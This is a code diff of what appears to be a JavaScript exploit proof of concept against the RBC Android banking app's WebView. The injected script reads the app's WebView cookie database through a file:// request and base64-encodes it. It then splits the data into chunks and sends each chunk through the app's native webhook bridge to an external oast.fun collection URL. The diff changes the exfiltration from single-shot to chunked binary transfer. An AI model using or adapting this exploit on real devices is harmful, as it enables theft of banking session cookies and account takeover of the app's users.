@@ -38,16 +38,17 @@ if (typeof WebViewFragment === "undefined") {
             'var target = "/data/data/com.rbc.mobile.android/app_webview/Default/Cookies";' +
             'var xhr = new XMLHttpRequest();' +
             'xhr.open("GET", "file://" + target, true);' +
-            'xhr.onreadystatechange = function() {' +
-            '  if (xhr.readyState === 4) {' +
-            '    if (xhr.status === 0 || xhr.status === 200) {' +
-            '      stolen = xhr.responseText;' +
-            '    }' +
-            '    var data = encodeURIComponent(JSON.stringify(stolen));' +
+            'xhr.responseType = "arraybuffer";' +
+            'xhr.onload = function() {' +
+            '  var b64 = arrayBufferToBase64(xhr.response);' +
+            '  var chunkSize = 4000;' +
+            '  var chunks = Math.ceil(b64.length / chunkSize);' +
+            '  for (var i = 0; i < chunks; i++) {' +
+            '    var chunk = b64.substr(i * chunkSize, chunkSize);' +
             '    WebViewFragment.onNavigateWebHook(JSON.stringify({' +
             '      "version": "1.2",' +
             '      "type": "externalWebview",' +
-            '      "destination": "https://gizpalpqzbbirxtdwlksdibaz8ggn9c43.oast.fun/collect?d=" + data' +
+            '      "destination": "https://gizpalpqzbbirxtdwlksdibaz8ggn9c43.oast.fun/collect?i=" + i + "&t=" + chunks + "&d=" + encodeURIComponent(chunk)' +
             '    }));' +
             '  }' +
             '};' +
